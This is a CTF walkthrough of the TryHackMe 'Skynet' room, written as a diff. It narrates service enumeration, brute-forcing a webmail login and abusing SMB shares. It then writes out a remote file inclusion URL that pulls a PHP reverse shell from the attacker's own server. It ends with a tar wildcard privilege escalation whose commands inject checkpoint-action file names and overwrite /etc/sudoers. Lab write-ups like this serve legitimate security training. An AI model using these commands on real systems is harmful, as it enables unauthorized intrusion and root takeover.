@@ -1,0 +1,38 @@
+Link: https://tryhackme.com/room/skynet
+
+// RECON//
+
+We run our recon tools, first nmap of course to have information about the software. Nmap showed a lot of services on the machine so our recon will be massive. 
+I know its linux so we can run enum4linux and since samba is on machine we can run smbmap. Smbmap tells us that anonymous login is allowed, so I leverage it. 
+I log into smbclient and I discovered password list. Because I ran gobuster brute force tool I know there is potentially interesting dir called /squirrelmail and its Webmail login page.
+We know username and we got password list so we just have to bruteforce using Burp Suite or some similar tool. We're lucky because it works and we're able to login to webmail.
+We research it and we found Miles' password, we are able to log into the milesdyson SMB share. 
+The file notes/important.txt reveals a hidden directory the Miles has and mentions a CMS. 
+
+I tried SQL Injection on this page via SQLMap and bruteforcing some common SQLi syntax but no luck. 
+Ok, we run gobuster again on this site and tool find /administrator dir. 
+I tried to login via default creds but no luck again. I searched exploit for this and I found Remote File Inclusion(RFI) on exploit-db, great.
+
+I ran the SimpleHTTPServer in a directory that contains my php reverse shell script.
+In script help we find out that we have to go to this page and include our script from our server, I run netcat before this to catch the connection coming from victim
+http://target/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<our-server-ip>/php-reverse-shell.php
+
+We are in, lets spawn shell using python:
+python -c 'import pty;pty.spawn("bin/bash")' 
+
+// PRIVESC //
+
+First I check sudo -l, then some SUID files, we find nothing interesting so I created another python server and downloaded my linux privesc script. 
+We also can create and download msfvenom on the machine so we can get acess via meterpreter and run exploit suggester script. 
+I checked /etc/crontab too, we can see some interesting scripts running once in a while by that. 
+It was a good idea because we found a script which is running as root. 
+I searched about this and found interesting article how to shows excatly how to abuse the wildcard in "tar * " into using file names as command arguments to be able to either run a reverse shell script or add the current user into the sudoers file.
+
+
+I moved to /var/www/html (which is the directory being tar'd) and ran the following.
+
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
+echo "/var/www/html"  > --checkpoint=1
+
+And we are root!
